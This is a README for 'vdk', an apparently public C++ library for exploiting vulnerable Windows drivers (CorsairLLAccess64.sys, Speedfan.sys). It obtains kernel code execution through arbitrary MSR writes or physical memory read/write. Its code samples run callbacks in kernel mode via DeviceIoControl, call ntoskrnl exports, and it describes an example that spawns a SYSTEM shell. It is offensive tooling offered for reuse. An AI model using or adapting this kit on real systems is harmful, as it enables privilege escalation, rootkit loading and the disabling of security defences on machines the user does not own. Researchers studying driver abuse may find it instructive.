# vdk - vulnerable driver kit

*vdk* is a set of utilities used to help with exploitation of a vulnerable driver.
There are 2 main features of this library:
1. Getting kernel code execution via arbitrary msr write vulnerability
2. Getting kernel code execution via arbitrary physical memory read/write vulnerability

This project was written after I played with a few vulnerable drivers and was highly inspired by [msrexec](https://back.engineering/22/03/2021/) and [vdm](https://back.engineering/01/11/2020/) projects. I suggest you to read them first to understand what's going on.

Treat this project as a rewritten and combined version of those two.

There are 2 vulnerable drivers that you can use this library with but it should be easy to extend to use with any vulnerable driver. The corresponding code is in `example/src/llaccess.hpp` for `CorsairLLAccess64.sys` and `example/src/speedfan.hpp` for `Speedfan.sys`.
The example project shows every part of this library and uses speedfan driver to spawn shell with system privileges.

# How to use
cmkr example:
```
[fetch-content.vdk]
git = "https://github.com/archercreat/vdk.git"
...
link-libraries = ["vdk"]
```

cmake example:
```cmake
include(FetchContent)
FetchContent_Declare(vdk GIT_REPOSITORY https://github.com/archercreat/vdk.git)
FetchContent_MakeAvailable(vdk)

target_link_libraries(${PROJECT_NAME} PRIVATE vdk)
```

# Examples
Please refer to example folder for more examples.

Execute callback in kernel space by abusing abritrary msr write vulnerability:
```cpp
using dbgprint_t = void(*)(const char*, ...);

vdk::msr::exec([&](void* base, vdk::resolver_t resolver)
{
	auto print = reinterpret_cast<dbgprint_t>(resolver(base, "DbgPrint"));
	print("Hello from kernel! cr3: 0x%llx\n", __readcr3());
},
[&](uint32_t msr, uint64_t value)
{
    wrmsr_cmd cmd
    {
        .msr   = msr,
        .value = value
    };
    unsigned long temp, result;
    return DeviceIoControl(drv, ioctl_wrmsr, &cmd, sizeof(cmd), &result, sizeof(result), &temp, nullptr);
});
```

Execute any ntoskrnl exported function:
```cpp
void* sysproc{};
auto status = vdk::map::syscall<proclookup_t>(rdmem, wrmem, "PsLookupProcessByProcessId", 4, &sysproc);
fassert(NT_SUCCESS(status));
```

Iterate over physical regions:
```cpp
for (const auto& region : vdk::phy::regions())
{
	std::printf("Region: 0x%llx - 0x%llx\n", region.start, region.start + region.size);
}
```

Resolve exported function from pe module:
```cpp
std::vector<uint8_t> raw;
vdk::drv::read_file("C:\\Windows\\System32\\ntoskrnl.exe", raw);
auto rva = vdk::pe::get_export_rva(raw.data(), "RtlFindExportedRoutineByName");
```

Retrieve loaded modules list:
```cpp
for (const auto& module : vdk::drv::loaded())
{
	std::printf("0x%llx - 0x%llx %s\n", module.base, module.base + module.size, module.name.c_str());
}
```

Scan memory region for patterns (`0x00` - any character):
```cpp
std::vector<uint8_t> buf{ 0x69, 0x69, 0x69, 0x10 };
auto ptr = vdk::mem::find_first(buff.data(), buf.size(), "\x69\x69\x69\x00", 4);
fassert(ptr);
```

# Notes
The msr exploitation is highly unstable and should be used as a last resort. There is a high chance that the thread will switch to another core where `cr4.smap` isn't disabled. If you really want to use msr exploit, build project in `Release` mode and replace cr4 value that is specific to your PC in `lib/vdk/msr.cpp` (I didn't bother getting cr4 value dynamically but might do it later).

# build
```
cmake -B build
cmake --build build --config Release
```

# Credits
All credits go to `_xeroxz` and his `msrexec` and `vdm` projects.
